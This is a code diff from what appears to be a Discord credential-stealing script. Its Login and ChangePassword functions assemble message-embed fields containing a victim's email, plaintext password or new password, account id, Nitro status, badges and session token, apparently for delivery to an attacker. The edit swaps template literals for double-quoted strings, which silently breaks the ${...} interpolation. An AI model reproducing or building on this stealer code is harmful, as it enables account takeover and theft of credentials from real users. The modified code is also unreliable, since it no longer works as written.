@@ -153,52 +153,52 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": " name",
-			    "value": ` - ` + json.username + `#` + json.discriminator,
+			    "value": " - " + json.username + "#" + json.discriminator,
                             "inline": true
                         },
                         {
                             "name": " id",
-                            "value": ` - ` + json.id,
+                            "value": " - " + json.id,
                             "inline": true
                         },
                         {
                             "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
+                            "value": "᲼᲼᲼᲼",
                             "inline": false
                         },
                         {
                             "name": " email",
-                            "value": ` - ${email}`,
+                            "value": " - ${email}",
                             "inline": true
                         },
                         {
                             "name": " password",
-                            "value": ` - ${password}`,
+                            "value": " - ${password}",
                             "inline": true
                         },
                         {
                             "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
+                            "value": "᲼᲼᲼᲼",
                             "inline": false
                         },
                         {
                             "name": " nitro type",
-                            "value": ` - ${GetNitro(json.premium_type)}`,
+                            "value": " - ${GetNitro(json.premium_type)}",
                             "inline": false
                         },
                         {
                             "name": " badges",
-                            "value": ` - ${GetBadges(json.flags)}`,
+                            "value": " - ${GetBadges(json.flags)}",
                             "inline": false
                         },
                         {
                             "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
+                            "value": "᲼᲼᲼᲼",
                             "inline": false
                         },
                         {
                             "name": " token",
-                            "value": ` - ${token}`,
+                            "value": " - ${token}",
                             "inline": false
                         }
                     ],
@@ -244,52 +244,52 @@ function ChangePassword(oldpassword, newpassword, token) {
                        "fields": [
                             {
                                 "name": " name",
-			        "value": ` - ` + json.username + `#` + json.discriminator,
+			        "value": " - " + json.username + "#" + json.discriminator,
                                 "inline": true
                             },
                             {
                                 "name": " id",
-                                "value": ` - ` + json.id,
+                                "value": " - " + json.id,
                                 "inline": true
                             },
                             {
                                 "name": "᲼᲼᲼᲼",
-                                "value": `᲼᲼᲼᲼`,
+                                "value": "᲼᲼᲼᲼",
                                 "inline": false
                             },
                             {
                                 "name": " email",
-                                "value": ` - ${json.email}`,
+                                "value": " - ${json.email}",
                                 "inline": true
                             },
                             {
                                 "name": " new password",
-                                "value": ` - ${newpassword}`,
+                                "value": " - ${newpassword}",
                                 "inline": true
                             },
                             {
                                 "name": "᲼᲼᲼᲼",
-                                "value": `᲼᲼᲼᲼`,
+                                "value": "᲼᲼᲼᲼",
                                 "inline": false
                             },
                             {
                                 "name": " nitro type",
-                                "value": ` - ${GetNitro(json.premium_type)}`,
+                                "value": " - ${GetNitro(json.premium_type)}",
                                 "inline": false
                             },
                             {
                                 "name": " badges",
-                                "value": ` - ${GetBadges(json.flags)}`,
+                                "value": " - ${GetBadges(json.flags)}",
                                 "inline": false
                             },
                             {
                                 "name": "᲼᲼᲼᲼",
-                                "value": `᲼᲼᲼᲼`,
+                                "value": "᲼᲼᲼᲼",
                                 "inline": false
                             },
                             {
                                 "name": " token",
-                                "value": ` - ${token}`,
+                                "value": " - ${token}",
                                 "inline": false
                             }
                         ],
